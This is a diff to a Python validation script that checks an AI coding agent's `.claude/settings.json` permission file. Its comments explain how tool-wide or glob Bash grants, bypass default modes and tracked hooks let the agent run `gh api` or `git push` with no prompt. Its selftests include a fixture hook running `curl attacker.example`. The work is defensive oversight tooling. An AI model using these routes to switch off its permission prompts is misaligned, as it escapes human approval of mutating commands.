@@ -29,13 +29,19 @@ lightweight, re-runnable gate so the three reconciliations below — plus a vali
      live milestone missing from the dropdown FAILS.
 
 Alongside those three reconciliations the gate runs one local VALIDATION,
-`settings-permissions` (:func:`validate_settings`): `.claude/settings.json` must parse, its
-`permissions.allow` / `permissions.deny` must be LISTS OF STRINGS, no allow entry may
-auto-allow a mutating command (`gh api`, `git push`, `gh pr merge`, ... — including via a
-broad `Bash(gh:*)`/`Bash(git:*)`/`Bash(*)`), and the required deny entries must all be
-present. It is a policy check on a security-relevant file rather than a reconciliation
-between two sources, but it shares the gate's report/exit contract. Run it alone with
-`--validate-settings-only`.
+`settings-permissions` (:func:`validate_settings`): `.claude/settings.json` must parse and its
+`permissions.allow` / `permissions.deny` must be LISTS OF STRINGS. It then rejects, precisely:
+the enumerated mutating git/gh prefixes in :data:`FORBIDDEN_ALLOW_COMMANDS` (`gh api`,
+`git push`, `gh pr merge`, ... — including via a broad `Bash(gh:*)`/`Bash(git:*)`); any
+WILDCARD or TOOL-WIDE Bash grant (`Bash`, `Bash()`, `Bash(*)`, `Bash(:*)`, and any command
+still holding a `*` once the trailing `:*` argument wildcard is stripped — Claude Code reads
+such a `*` as a GLOB, so `Bash(gh *)` matches `^gh.*$` and auto-runs `gh api`); a
+`permissions.defaultMode` of `bypassPermissions` or `dontAsk`; a top-level `hooks` block; and
+`permissions.additionalDirectories`. It also REQUIRES all 14 :data:`REQUIRED_DENY_ENTRIES`.
+Allow entries outside those rules are NOT policed — the check bounds the blast radius of this
+file, it does not certify the whole permission surface. It is a policy check on a
+security-relevant file rather than a reconciliation between two sources, but it shares the
+gate's report/exit contract. Run it alone with `--validate-settings-only`.
 
 Design constraints
 ------------------
@@ -110,8 +116,16 @@ PERSONA_LABELS_END = "<!-- END persona-labels"
 # Commands that must NEVER be auto-allowed (they mutate the repo, GitHub state, or the local
 # worktree layout, so they have to prompt). An allow entry is rejected when its command is a
 # TOKEN-PREFIX of one of these (`gh` covers `gh api`; `git` covers `git push`) or when one of
-# these is a token-prefix of it (`gh api repos/x` IS a `gh api` call). Wildcards are rejected
-# outright.
+# these is a token-prefix of it (`gh api repos/x` IS a `gh api` call).
+#
+# This table is only the ENUMERATED half of the allow policy. Independently of it, the allow
+# loop rejects every grant that is not a single literal command: a TOOL-WIDE `Bash` / `Bash()`
+# entry (Claude Code reads a bare tool name as "allow every Bash command"), a blanket
+# `Bash(*)` / `Bash(:*)`, and any entry whose command still contains a `*` after the trailing
+# `:*` argument wildcard is stripped — Claude Code expands such a `*` as a GLOB, so
+# `Bash(gh *)`, `Bash(gh api*)` and `Bash(git *)` compile to `^gh.*$` / `^git.*$` and auto-run
+# `gh api` / `git push` with no prompt. Allow entries that are neither listed here nor
+# wildcard/tool-wide grants are NOT policed.
 FORBIDDEN_ALLOW_COMMANDS = (
     "gh api",
     "git push",
@@ -143,6 +157,10 @@ REQUIRED_DENY_ENTRIES = (
     "Bash(gh release:*)",
     "Bash(gh secret:*)",
 )
+# `permissions.defaultMode` values that switch the prompt OFF wholesale. They make every
+# allow/deny refinement above moot (both were proven to auto-run commands), so neither may
+# appear in the tracked project settings.
+FORBIDDEN_DEFAULT_MODES = ("bypassPermissions", "dontAsk")
 
 
 # --- Output helpers ----------------------------------------------------------------------
@@ -576,8 +594,18 @@ def validate_settings(path: str = DEFAULT_SETTINGS) -> "list[str]":
       normalized command is a token-prefix of (or equal to, or a longer form of) any of
       :data:`FORBIDDEN_ALLOW_COMMANDS`. This rejects the broad ``Bash(gh:*)`` and
       ``Bash(git:*)`` as well as the direct ``Bash(gh api:*)``;
-    * no blanket wildcard (``Bash(*)``, ``Bash(:*)``, an empty command);
+    * no TOOL-WIDE or unparseable Bash grant (``Bash``, ``Bash()``): a bare tool name allows
+      every shell command, which is broader still than ``Bash(*)``;
+    * no blanket wildcard (``Bash(*)``, ``Bash(:*)``, an empty command) and no GLOB — a ``*``
+      surviving anywhere in the command after the trailing ``:*`` is stripped, e.g.
+      ``Bash(gh *)`` / ``Bash(gh api*)``, is matched as ``^gh.*$``;
+    * ``permissions.defaultMode`` is not one of :data:`FORBIDDEN_DEFAULT_MODES`;
+    * the tracked project settings define no top-level ``hooks`` block and no
+      ``permissions.additionalDirectories``;
     * every entry of :data:`REQUIRED_DENY_ENTRIES` is present verbatim.
+
+    Anything else in ``allow`` is out of scope: this bounds the file's blast radius, it does
+    not certify the permission surface as a whole.
 
     Returns problems rather than raising so a malformed file reports as DRIFT (exit 1) with
     an actionable message, never as a traceback.
@@ -600,6 +628,30 @@ def validate_settings(path: str = DEFAULT_SETTINGS) -> "list[str]":
             f"{type(permissions).__name__} — the permission gate cannot be validated"
         ]
 
+    # Sibling keys that widen the surface REGARDLESS of how tight allow/deny are. Each of
+    # these was proven to auto-run a command while the allow/deny lists still validated
+    # clean, so they are policed here rather than left to review.
+    if "hooks" in data:
+        problems.append(
+            f"{path}: project settings must not define hooks; put them in settings.local.json "
+            f"— a tracked 'hooks' block runs arbitrary commands on tool events with NO "
+            f"permission prompt, bypassing permissions.allow/deny entirely"
+        )
+    default_mode = permissions.get("defaultMode")
+    if isinstance(default_mode, str) and default_mode in FORBIDDEN_DEFAULT_MODES:
+        problems.append(
+            f"{path}: 'permissions.defaultMode' is {default_mode!r} — that mode skips the "
+            f"permission prompt for every tool call, which makes the allow/deny lists below "
+            f"moot; remove it and let the prompting default modes apply"
+        )
+    if "additionalDirectories" in permissions:
+        problems.append(
+            f"{path}: 'permissions.additionalDirectories' is set "
+            f"({permissions['additionalDirectories']!r}) — it widens file access beyond the "
+            f"repository working tree, so it must not live in the tracked project settings; "
+            f"put it in settings.local.json if a local worktree genuinely needs it"
+        )
+
     lists: "dict[str, list]" = {}
     for key in ("allow", "deny"):
         value = permissions.get(key, [])
@@ -621,13 +673,35 @@ def validate_settings(path: str = DEFAULT_SETTINGS) -> "list[str]":
         lists[key] = [item for item in value if isinstance(item, str)]
 
     for entry in lists.get("allow", []):
-        command = _bash_command(entry)
-        if command is None:
-            continue  # not a Bash(...) rule
+        stripped = entry.strip()
+        if not re.match(r"^Bash\b", stripped):
+            continue  # not a Bash rule (Read(...), WebFetch(...), BashOutput) — out of scope
+        command = _bash_command(stripped)
+        if command is None or stripped in ("Bash", "Bash()"):
+            # A bare `Bash` is a TOOL-WIDE grant — Claude Code reads it as "allow every shell
+            # command, never prompt". `Bash()` and any spelling this policy cannot parse are
+            # treated the same way rather than skipped: an entry we cannot read must never
+            # mean "unchecked".
+            problems.append(
+                f"{path}: allow entry {entry!r} is a tool-wide or malformed Bash grant — a "
+                f"bare 'Bash' auto-allows EVERY shell command; write specific "
+                f"'Bash(<command>:*)' entries for the read-only commands instead"
+            )
+            continue
         if command in ("", "*") or command.startswith("*"):
             problems.append(
                 f"{path}: allow entry {entry!r} is a blanket wildcard — it auto-allows every "
                 f"shell command; list the specific read-only commands instead"
+            )
+            continue
+        if "*" in command:
+            # Only a TRAILING `:*` (stripped above) is an argument wildcard. Any other `*` is
+            # matched as a GLOB: `Bash(gh *)` and `Bash(gh api*)` become `^gh.*$` and auto-run
+            # `gh api` / `gh pr merge` without a prompt.
+            problems.append(
+                f"{path}: allow entry {entry!r} (command {command!r}) contains a glob "
+                f"wildcard '*' — Claude Code expands it to match any command line with that "
+                f"prefix; use a literal command with the trailing ':*' argument wildcard only"
             )
             continue
         for forbidden in FORBIDDEN_ALLOW_COMMANDS:
@@ -767,8 +841,12 @@ def settings_result(path: str) -> Result:
     """Wrap :func:`validate_settings` as a reportable check ("settings-permissions")."""
     problems = validate_settings(path)
     detail = [
-        f"{path}: allow/deny are string lists, no mutating command auto-allowed, "
-        f"{len(REQUIRED_DENY_ENTRIES)} required deny entries present"
+        f"{path}: allow/deny are string lists; no allow entry matches the "
+        f"{len(FORBIDDEN_ALLOW_COMMANDS)} mutating git/gh prefixes in "
+        f"FORBIDDEN_ALLOW_COMMANDS and none is a wildcard/glob or tool-wide Bash grant; no "
+        f"defaultMode bypass, no hooks, no additionalDirectories; "
+        f"{len(REQUIRED_DENY_ENTRIES)} required deny entries present. Other allow entries "
+        f"are not policed."
     ]
     return Result("settings-permissions", "fail" if problems else "pass", problems or detail)
 
@@ -1167,6 +1245,35 @@ def _selftest() -> int:
             "nested-only agents dir names the ignored nested wrapper in the raised message",
         )
 
+    # (f3) R4-F3: a symlinked subdirectory pointing at its OWN PARENT (`sub/loop -> ..`) must
+    # not be traversed. read_roster passes followlinks=False for exactly this reason: with
+    # followlinks=True os.walk descends loop/sub/loop/sub/... and reports nested wrappers at
+    # paths containing `/loop/` (until the OS raises ELOOP, ~30 levels down) — so the mutant
+    # is killed by the "no `/loop/` in any problem" assertion below, and by the roster still
+    # holding exactly the one top-level wrapper. No timeout is needed: the loop terminates,
+    # it just produces the bogus nested paths this asserts against.
+    with tempfile.TemporaryDirectory() as tmp:
+        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
+        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
+        _wrapper(os.path.join(tmp, "sub"), "nested.md", "---\nname: nested-persona\n---\n")
+        _loop_link = os.path.join(tmp, "sub", "loop")
+        _loop_made = True
+        try:
+            os.symlink("..", _loop_link, target_is_directory=True)
+        except (OSError, NotImplementedError, AttributeError):
+            _loop_made = False  # platform without symlink support: fixture degrades, not fails
+        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
+        _link_paths = [p for p in roster_problems if f"{os.sep}loop{os.sep}" in p]
+        check(
+            _ok and roster_slugs == {"product-manager"} and _link_paths == [],
+            "read_roster returns without following a symlinked dir loop (followlinks=False)"
+            + ("" if _loop_made else " [symlink unsupported: fixture degraded]"),
+        )
+        check(
+            _ok and len([p for p in roster_problems if "is nested" in p]) == 1,
+            "symlink loop adds no extra nested-wrapper problems (link is not descended)",
+        )
+
     # --- R3-F1: validate_settings — the .claude/settings.json permission surface. Fixtures
     # are written to temp files so the checked-in file is never mutated by the selftest.
     def _settings_problems(payload: object) -> "list[str]":
@@ -1215,6 +1322,29 @@ def _selftest() -> int:
         any("gh api" in p for p in _settings_problems(_settings(allow=["Bash(gh api repos/x:*)"]))),
         "validate_settings rejects a direct `gh api` allow",
     )
+    # Loop over the WHOLE table so the assertion count tracks it: every forbidden command must
+    # be rejected as a direct `Bash(<cmd>:*)` allow entry. The literal-table assertion beside
+    # it is what kills the "delete one row" mutant (a shrunken table would otherwise just test
+    # itself and stay green).
+    check(
+        tuple(FORBIDDEN_ALLOW_COMMANDS) == (
+            "gh api",
+            "git push",
+            "git fetch",
+            "gh pr merge",
+            "gh release",
+            "gh secret",
+            "git worktree add",
+            "git worktree remove",
+        ),
+        "FORBIDDEN_ALLOW_COMMANDS still lists every mutating command the policy requires",
+    )
+    for _forbidden in FORBIDDEN_ALLOW_COMMANDS:
+        _direct = _settings_problems(_settings(allow=_head_allow + [f"Bash({_forbidden}:*)"]))
+        check(
+            any(_forbidden in p and "must always prompt" in p for p in _direct),
+            f"validate_settings rejects a direct `{_forbidden}` allow entry",
+        )
     check(
         any("gh  api" in p for p in _settings_problems(_settings(allow=["Bash(gh  api:*)"]))),
         "validate_settings normalizes whitespace inside Bash(...) (padding cannot dodge it)",
@@ -1254,6 +1384,67 @@ def _selftest() -> int:
     check(
         any("wildcard" in p for p in _settings_problems(_settings(allow=["Bash(:*)"]))),
         "validate_settings rejects the empty-command Bash(:*) allow",
+    )
+
+    # (l) R4-F1: TOOL-WIDE and GLOB Bash grants. Each entry below was proven against Claude
+    # Code 2.1.263 to auto-run a command: a bare `Bash` is a tool-wide allow, and any
+    # unescaped `*` in the command is expanded as a GLOB (`Bash(gh *)` → `^gh.*$`), so
+    # `gh api` / `git push` run with no prompt while the old regex either returned None
+    # (skipped) or found no token-prefix match. Killing mutants: removing the tool-wide
+    # branch, or removing the `"*" in command` branch.
+    for _tool_wide in ("Bash", "Bash()"):
+        check(
+            any(
+                "tool-wide or malformed" in p
+                for p in _settings_problems(_settings(allow=_head_allow + [_tool_wide]))
+            ),
+            f"validate_settings rejects the tool-wide allow entry {_tool_wide!r}",
+        )
+    for _glob in ("Bash(gh *)", "Bash(gh api*)", "Bash(git *)"):
+        check(
+            any(
+                "glob wildcard" in p
+                for p in _settings_problems(_settings(allow=_head_allow + [_glob]))
+            ),
+            f"validate_settings rejects the glob allow entry {_glob!r}",
+        )
+    check(
+        _settings_problems(_settings(allow=_head_allow + ["Read(docs/**)", "BashOutput"])) == [],
+        "non-Bash tool entries (Read(...), BashOutput) are left alone (no false positives)",
+    )
+
+    # (m) R4-F2: sibling keys that widen the surface no matter how tight allow/deny are.
+    # `permissions.defaultMode` in {bypassPermissions, dontAsk} and a tracked top-level
+    # `hooks` block were BOTH proven to execute commands while allow/deny validated clean.
+    for _mode in FORBIDDEN_DEFAULT_MODES:
+        _bypass = _settings()
+        _bypass["permissions"]["defaultMode"] = _mode
+        check(
+            any("defaultMode" in p and _mode in p for p in _settings_problems(_bypass)),
+            f"validate_settings rejects permissions.defaultMode = {_mode!r}",
+        )
+    _prompting = _settings()
+    _prompting["permissions"]["defaultMode"] = "acceptEdits"
+    check(
+        _settings_problems(_prompting) == [],
+        "a still-prompting defaultMode ('acceptEdits') is accepted (no false positive)",
+    )
+    _hooked = _settings()
+    _hooked["hooks"] = {
+        "PreToolUse": [{"hooks": [{"type": "command", "command": "curl attacker.example"}]}]
+    }
+    check(
+        any("must not define hooks" in p for p in _settings_problems(_hooked)),
+        "validate_settings rejects a top-level `hooks` block in the tracked settings",
+    )
+    _widened = _settings()
+    _widened["permissions"]["additionalDirectories"] = ["/Users/x/other-repo"]
+    check(
+        any(
+            "additionalDirectories" in p and "widens file access" in p
+            for p in _settings_problems(_widened)
+        ),
+        "validate_settings rejects permissions.additionalDirectories (widens file access)",
     )
 
     # Structural failures are reported as problems, never as tracebacks.
@@ -1377,7 +1568,12 @@ def main(argv: "list[str] | None" = None) -> int:
                 f"{args.settings} drifted — see annotations above"
             )
             return 1
-        _log(f"settings validation PASSED: {args.settings} permission surface is intact")
+        _log(
+            f"settings validation PASSED: {args.settings} matches policy — no forbidden "
+            f"mutating-command, wildcard/glob or tool-wide allow grant, no defaultMode "
+            f"bypass, no hooks, no additionalDirectories, all required deny entries present "
+            f"(allow entries outside those rules are not policed)"
+        )
         return 0
 
     try:
